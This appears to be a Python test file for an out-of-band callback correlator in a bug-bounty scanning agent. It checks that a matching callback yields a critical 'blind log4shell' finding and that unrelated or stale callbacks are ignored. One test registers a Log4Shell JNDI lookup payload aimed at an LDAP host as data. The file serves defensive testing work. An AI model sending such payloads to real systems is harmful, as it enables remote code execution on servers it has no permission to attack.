"""Tests for the OOB correlator (post-scan pairing)."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path
from uuid import uuid4

from bounty_agent.core import Severity
from bounty_agent.oob import CallbackEvent, CallbackLog, TokenRegistry
from bounty_agent.oob.correlator import OobCorrelationConfig, OobCorrelator


class TestCorrelatorLocalMode:
    async def test_match_emits_critical_finding(self, tmp_path: Path) -> None:
        # Operator's setup: a token registry that the fuzzer wrote to,
        # and a callback log the OOB server populated.
        registry = TokenRegistry()
        token = registry.register(
            target_url="https://target.example/api",
            payload="${jndi:ldap://X/log4j}",
            category="log4shell",
            scan_id=uuid4(),
        )

        log_path = tmp_path / "callbacks.jsonl"
        log = CallbackLog(persist_path=log_path)
        # Server received a request whose Host header carried our token.
        log.append(
            CallbackEvent(
                token=token.token,
                protocol="http",
                src_ip="198.51.100.10",
                method="GET",
                path="/log4j",
                host=f"{token.token}.callback.example",
                user_agent="Java/1.8",
                timestamp=datetime.now(UTC),
            )
        )

        correlator = OobCorrelator(OobCorrelationConfig(local_log_path=log_path, wait_seconds=0))
        findings = await correlator.correlate(
            registry, scan_started_at=datetime.now(UTC) - timedelta(seconds=10)
        )
        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == Severity.CRITICAL
        assert "blind log4shell" in finding.title
        assert finding.evidence["token"] == token.token
        assert finding.evidence["callback_src_ip"] == "198.51.100.10"
        assert finding.evidence["callback_user_agent"] == "Java/1.8"
        assert finding.evidence["tool"] == "oob"

    async def test_no_match_returns_empty(self, tmp_path: Path) -> None:
        # Registry empty, log has an event for an unrelated token.
        registry = TokenRegistry()
        log_path = tmp_path / "callbacks.jsonl"
        log = CallbackLog(persist_path=log_path)
        log.append(
            CallbackEvent(
                token="not-our-token",
                protocol="http",
                src_ip="1.1.1.1",
                method="GET",
                path="/",
                host="x.callback.example",
                user_agent="",
                timestamp=datetime.now(UTC),
            )
        )
        correlator = OobCorrelator(OobCorrelationConfig(local_log_path=log_path, wait_seconds=0))
        findings = await correlator.correlate(
            registry, scan_started_at=datetime.now(UTC) - timedelta(seconds=10)
        )
        assert findings == []

    async def test_old_callbacks_filtered_by_scan_start(self, tmp_path: Path) -> None:
        # A callback for our token, but its timestamp is older than the
        # scan started. Must be filtered out (could be a leftover from
        # a previous scan against the same server).
        registry = TokenRegistry()
        token = registry.register(
            target_url="https://target.example/", payload="p", category="ssrf"
        )
        log_path = tmp_path / "callbacks.jsonl"
        log = CallbackLog(persist_path=log_path)
        old_time = datetime.now(UTC) - timedelta(minutes=5)
        log.append(
            CallbackEvent(
                token=token.token,
                protocol="http",
                src_ip="1.1.1.1",
                method="GET",
                path="/",
                host=f"{token.token}.callback.example",
                user_agent="",
                timestamp=old_time,
            )
        )
        correlator = OobCorrelator(OobCorrelationConfig(local_log_path=log_path, wait_seconds=0))
        # scan_started_at is one minute ago; old callback is older.
        findings = await correlator.correlate(
            registry, scan_started_at=datetime.now(UTC) - timedelta(minutes=1)
        )
        assert findings == []

    async def test_neither_source_returns_empty(self) -> None:
        # No poll_url, no local_log_path: nothing to do.
        registry = TokenRegistry()
        correlator = OobCorrelator(OobCorrelationConfig(wait_seconds=0))
        findings = await correlator.correlate(registry, scan_started_at=datetime.now(UTC))
        assert findings == []
